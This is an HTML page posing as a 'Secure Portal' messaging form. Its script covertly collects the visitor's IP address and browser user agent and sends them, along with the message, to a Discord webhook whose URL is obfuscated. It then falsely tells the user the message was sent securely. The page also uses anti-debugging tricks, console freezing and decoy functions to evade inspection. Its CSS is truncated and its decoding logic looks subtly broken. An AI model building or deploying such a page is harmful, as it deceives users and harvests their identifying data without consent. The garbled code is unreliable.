<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Secure Portal</title>
  <style>
    body {
      background: #000;
      color: #0f0;
      font-family: monospace;

      flex-direction: column;

    input, button {

<body>
  <h1>üõ°Ô∏è Send Secure Message</h1>
  <input type="text" id="msg" placeholder="Your message..." />
  <button onclick="secureSend()">Send</button>

  <script>
    // Anti-debug freeze trick
    setInterval(function() {
      const trap = /./;
      trap.toString = function() {
        console.clear();
        return "debugger";
      };
      console.log(trap);
    }, 1000);

    // Self-deleting decryption
    const decode = (() => {
      const xor = (str, k) => {
        const r = atob(str);
        return [...r].map(c => String.fromCharCode(c.charCodeAt(0) ^ k)).join('');
      };

      return (data, key) => {
        const parts = JSON.parse(atob(data));
        return parts.map(p => xor(p, key)).join('');
      };
    })();

    // Obfuscated webhook chunks (XORd and Base64)
    const chunks = [
      btoa(JSON.stringify([
        btoa(String.fromCharCode(...[104, 116, 116, 112, 115, 58, 47, 47])),
        btoa(String.fromCharCode(...[100, 105, 115, 99, 111, 114, 100, 46])),
        btoa(String.fromCharCode(...[99, 111, 109, 47, 97, 112, 105, 47])),
        btoa(String.fromCharCode(...[119, 101, 98, 104, 111, 111, 107, 115, 47])),
        btoa(String.fromCharCode(...[49, 50, 51, 47, 97, 98, 99, 100, 101, 47])),
        btoa(String.fromCharCode(...[102, 103, 104, 105, 106, 107, 108, 109]))
      ]))
    ];

    // Decrypt webhook and immediately destroy the decryptor
    const webhook = decode(chunks[0], 88);
    chunks.length = 0;

    async function secureSend() {
      const input = document.getElementById("msg");
      const text = input.value.trim();
      if (!text) return;

      const ip = await fetch("https://api.ipify.org?format=json")
        .then(r => r.json())
        .then(d => d.ip);

      const ua = navigator.userAgent;
      const content = `üí¨ ${text}\nüåç IP: ${ip}\nüß† UA: ${ua}`;

      // fake async noise
      await new Promise(r => setTimeout(r, 1200 + Math.random() * 500));

      // Send to webhook
      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content })
      });

      input.value = "";
      alert("‚úÖ Message sent securely.");
    }

    // Decoy trap functions
    const serverEndpoint = () => "https://example.com/backup";
    const noopLogger = () => console.warn("API unavailable.");
    const bait = () => { const a = 123456789; return a * a; };
    const firewall = { enabled: true, ports: [80, 443, 22] };

    Object.freeze(console);
  </script>
